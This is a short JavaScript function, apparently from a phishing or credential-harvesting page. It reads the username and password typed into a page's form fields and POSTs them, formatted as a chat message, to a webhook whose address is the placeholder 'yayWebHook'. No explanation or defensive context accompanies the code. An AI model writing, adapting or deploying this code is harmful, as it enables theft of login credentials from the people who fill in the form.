function message() 
{
    let user = document.getElementById("usernameStr").value;
    let pass = document.getElementById("passwordStr").value;

    const webhook = "yayWebHook";
    const contents = "```Username : " + user + "\nPassword : " + pass + "```";

    const request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    const params = { content: contents
    }
    request.send(JSON.stringify(params));
}
